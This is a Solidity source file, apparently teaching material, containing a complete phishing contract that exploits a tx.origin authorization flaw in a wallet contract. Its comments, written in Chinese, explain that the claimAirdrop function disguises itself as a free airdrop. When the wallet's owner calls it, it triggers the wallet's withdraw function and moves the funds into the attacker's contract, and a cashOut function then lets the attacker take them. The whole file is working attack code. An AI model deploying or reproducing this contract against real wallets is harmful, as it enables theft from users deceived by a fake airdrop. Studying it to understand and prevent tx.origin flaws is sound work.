// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITxOriginWallet {
    function withdraw() external;
    function owner() external view returns (address);
}

/**
 * @title TxOriginPhishing
 * @notice 🎣 钓鱼攻击合约 — 利用 tx.origin 漏洞偷钱
 */
contract TxOriginPhishing {
    ITxOriginWallet public immutable wallet;
    address public immutable attacker;

    constructor(address _wallet) {
        wallet = ITxOriginWallet(_wallet);
        attacker = msg.sender;
    }

    /// @notice 诱饵函数：伪装成"免费领空投"
    /// @dev 用户点击后，内部调用 wallet.withdraw()
    /// 因为 tx.origin 是用户（恰好是 wallet 的 owner），验证通过！
    function claimAirdrop() external {
        // 用户以为在领空投，实际上...
        wallet.withdraw(); // 👈 钱转到钓鱼合约了！
    }

    /// @notice 攻击者提走赃款
    function cashOut() external {
        require(msg.sender == attacker, "Not attacker");
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {}
}